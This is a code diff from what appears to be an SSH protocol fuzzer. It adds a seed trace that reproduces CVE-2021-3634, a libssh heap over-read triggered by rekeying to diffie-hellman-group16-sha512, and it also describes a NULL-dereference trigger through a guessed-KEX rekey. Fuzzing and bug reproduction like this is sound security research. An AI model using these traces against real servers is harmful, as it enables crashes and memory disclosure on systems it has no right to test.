@@ -2355,7 +2355,7 @@ pub fn seed_client_attacker_session_requests(server: AgentName) -> Trace<SshProt
 /// packet before the switch). AES-256-GCM, c2s counter = packet index since the
 /// first NewKeys.
 pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> {
-    seed_client_attacker_rekey_impl(server, false)
+    seed_client_attacker_rekey_impl(server, false, term! { fn_algo_curve25519_sha256 })
 }
 
 /// [`seed_client_attacker_rekey`] whose rekey KEXINIT announces a guessed KEX packet
@@ -2364,12 +2364,23 @@ pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> 
 /// post-auth rekey, dereferences a NULL kex-methods pointer. The flag is the `fn_kex_init`
 /// argument every KEXINIT already has, so the fuzzer reaches it by flipping one `fn_false`.
 pub fn seed_client_attacker_rekey_guess(server: AgentName) -> Trace<SshProtocolTypes> {
-    seed_client_attacker_rekey_impl(server, true)
+    seed_client_attacker_rekey_impl(server, true, term! { fn_algo_curve25519_sha256 })
+}
+
+/// [`seed_client_attacker_rekey`] whose rekey KEXINIT offers `diffie-hellman-group16-sha512`
+/// instead of curve25519 — nothing else changes: the CVE-2021-3634 witness. The server re-keys
+/// to a 64-byte digest while the session id stays the 32-byte one of the first (curve25519) KEX;
+/// libssh < 0.9.6 then copies the session id with the new digest length in
+/// `ssh_packet_set_newkeys` (heap over-read). The rekey ECDH_INIT is kept: as a KEXDH_INIT it
+/// carries the 32-byte public key as `e`, an in-range group16 value.
+pub fn seed_client_attacker_rekey_dh_group16(server: AgentName) -> Trace<SshProtocolTypes> {
+    seed_client_attacker_rekey_impl(server, false, term! { fn_algo_dh_group16_sha512 })
 }
 
 fn seed_client_attacker_rekey_impl(
     server: AgentName,
     first_kex_follows: bool,
+    rekey_kex: Term<SshProtocolTypes>,
 ) -> Trace<SshProtocolTypes> {
     // `false` keeps the honest seed byte-identical to its earlier form.
     let first_kex_follows = if first_kex_follows {
@@ -2428,7 +2439,7 @@ fn seed_client_attacker_rekey_impl(
     let rekey_kexinit = term! {
         fn_kex_init(
             (fn_cookie_zeros),
-            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
+            (fn_kex_algos((fn_namelist_1((@rekey_kex))))),
             (fn_sig_schemes((fn_namelist_append((fn_namelist_1((fn_algo_rsa_sha2_512))), (fn_algo_rsa_sha2_256))))),
             (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
             (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
